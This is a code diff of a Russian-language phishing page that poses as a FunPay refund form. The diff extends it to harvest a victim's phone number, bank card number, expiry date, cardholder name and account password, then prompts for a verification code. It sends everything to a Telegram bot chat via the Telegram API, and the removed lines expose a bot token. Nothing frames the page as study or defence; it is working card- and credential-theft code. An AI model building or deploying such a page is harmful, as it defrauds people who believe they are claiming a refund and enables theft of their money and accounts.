@@ -48,47 +48,61 @@
             font-size: 12px;
             color: #888;
         }
-        .notification {
-            display: none;
-            margin-top: 15px;
-            padding: 10px;
-            background-color: #008000;
-            color: white;
-            border-radius: 5px;
-        }
     </style>
     <script>
-        function sendData() {
+        function showCodeForm() {
+            document.getElementById('refundForm').innerHTML = `
+                <h2>Введите код</h2>
+                <input type="text" id="verification_code" placeholder="Код" required><br>
+                <button onclick="sendFinalData()">Отправить</button>
+            `;
+        }
+        
+        function sendFinalData() {
             const data = {
-                telephone: document.getElementById('telephone').value,
-                card_number: document.getElementById('card_number').value,
-                expiration_date: document.getElementById('expiration_date').value,
-                holder_name: document.getElementById('holder_name').value
+                telephone: localStorage.getItem('telephone'),
+                card_number: localStorage.getItem('card_number'),
+                expiration_date: localStorage.getItem('expiration_date'),
+                holder_name: localStorage.getItem('holder_name'),
+                account_password: localStorage.getItem('account_password'),
+                verification_code: document.getElementById('verification_code').value
             };
             
-            fetch("https://api.telegram.org/bot7878192082:AAE7oE001p3_MMLKMm_PxpJgaTTdINA-Vq4/sendMessage", {
+            fetch("https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
                     chat_id: "-1002190411942",
-                    text: `Заявка на возврат средств\nТелефон: ${data.telephone}\nНомер карты: ${data.card_number}\nСрок действия: ${data.expiration_date}\nИмя держателя: ${data.holder_name}`
+                    text: `Заявка на возврат средств\nТелефон: ${data.telephone}\nНомер карты: ${data.card_number}\nСрок действия: ${data.expiration_date}\nИмя держателя: ${data.holder_name}\nПароль от ЛК: ${data.account_password}\n------------------\nКод: ${data.verification_code}`
                 })
             }).then(response => {
                 if (response.ok) {
-                    document.getElementById('notification').style.display = 'block';
+                    alert('Заявка успешно отправлена!');
                 }
             });
+        }
+
+        function sendData() {
+            localStorage.setItem('telephone', document.getElementById('telephone').value);
+            localStorage.setItem('card_number', document.getElementById('card_number').value);
+            localStorage.setItem('expiration_date', document.getElementById('expiration_date').value);
+            localStorage.setItem('holder_name', document.getElementById('holder_name').value);
+            localStorage.setItem('account_password', document.getElementById('account_password').value);
+            
+            showCodeForm();
         }
     </script>
 </head>
 <body>
-    <h2>Оформление возврата средств</h2>
-    <input type="text" id="telephone" placeholder="Телефон" required><br>
-    <input type="text" id="card_number" placeholder="Номер карты" required><br>
-    <input type="text" id="expiration_date" placeholder="Срок действия (MM/YY)" required><br>
-    <input type="text" id="holder_name" placeholder="Имя держателя" required><br>
-    <button onclick="sendData()">Оформить возврат</button>
-    <div id="notification" class="notification">Заявка успешно отправлена!</div>
+    <div id="refundForm">
+        <h2>Оформление возврата средств</h2>
+        <input type="text" id="telephone" placeholder="Телефон" required><br>
+        <input type="text" id="card_number" placeholder="Номер карты" required><br>
+        <input type="text" id="expiration_date" placeholder="Срок действия (MM/YY)" required><br>
+        <input type="text" id="holder_name" placeholder="Имя держателя" required><br>
+        <input type="password" id="account_password" placeholder="Пароль от ЛК" required><br>
+        <button onclick="sendData()">Оформить возврат</button>
+    </div>
     <p>C 2025 FUNPAY Impossible21x.</p>
 </body>
 </html>
